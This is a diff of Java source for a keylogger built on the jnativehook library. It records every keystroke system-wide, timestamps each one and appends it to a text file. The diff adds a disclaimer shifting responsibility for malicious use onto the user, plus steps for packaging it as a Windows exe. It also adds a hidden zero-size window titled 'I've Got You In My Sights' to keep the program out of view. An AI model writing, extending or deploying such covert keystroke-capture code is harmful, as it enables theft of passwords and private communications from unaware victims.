@@ -1,6 +1,22 @@
-// GUI 추가 및 버퍼효율 개선 필요 (Still implementing...)
+/*
+ * 모든 악의적인 사용에 대한 책임은 전적으로 사용자 본인에게 있습니다.
+ *
+ * The responsibility for all malicious use rests entirely with the person using it.
+ *
+ * */
+/*
+ * 사용법 : jhkeylog.exe 파일 클릭 
+ * (종료법 : 프로세스에서 jvm 라이브러리 종료시 같이 종료 됩니다)
+ * 
+ * 
+ * */
+/*
+ * exe 파일 생성 법 => porject export (jar) => jsmooth 이용
+ * 
+ * */
 //-------------------------------------------------
-// import java.io.BufferedWriter;
+
+
 import java.io.File;
 import java.io.FileWriter; // for File Writer
 //-------------------------------------------------
@@ -10,13 +26,19 @@ import java.util.logging.Level;
 import java.util.logging.LogManager;
 import java.util.logging.Logger;
 
+import javax.swing.JFrame;
+import javax.swing.JTextField;
+
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+
 public class JavaNativeHook_keylogger implements NativeKeyListener {
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent arg0) {
+		
+		    
 		//+++++++++++++++++++++++++++Time & DateFormat ++++++++++++++++++++++++++++++
 		SimpleDateFormat format1 = new SimpleDateFormat ( "YYYY-MM-dd HH:mm:ss" );
 		
@@ -94,7 +116,9 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 
     System.out.print(st); //Console printing
 	//--------------------for File Writer-------------------------------
-    String fileName = "C:\\Users\\admin\\Desktop\\TEST\\test.txt";
+    String fileName = "C:\\Users\\admin\\Desktop\\TEST\\jj.txt";
+    //저장 디렉토리 설정
+    
     try{
         
         // Create File
@@ -104,9 +128,9 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
         String space="\r\n";
         // Write a string into file
         
-        //fwriter.write(time1); //현재 시간 추가
+        
+		//fwriter.write(time1); //현재 시간 추가  
         fwriter.write(time1+st+space);
-       //fwriter.write(space);
         fwriter.flush();
 
         fwriter.close();
@@ -134,8 +158,18 @@ public class JavaNativeHook_keylogger implements NativeKeyListener {
 		} catch(Exception e) {
 			System.out.println("Error : "+e);
 		}
-		
-		GlobalScreen.addNativeKeyListener(new JavaNativeHook_keylogger());
+		//===========================================================
+		 JFrame fWindow = new JFrame("I've Got You In My Sights");
+	     
+		    fWindow.setBounds(0,0,0,0);
+		    fWindow.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+
+		    JTextField typingArea = new JTextField(20);
+		    fWindow.add(typingArea);
+		    fWindow.setVisible(false); // you can't see frame
+		//===========================================================
+		    GlobalScreen.addNativeKeyListener(new JavaNativeHook_keylogger());
+		    }
 	}	
-}
+
 
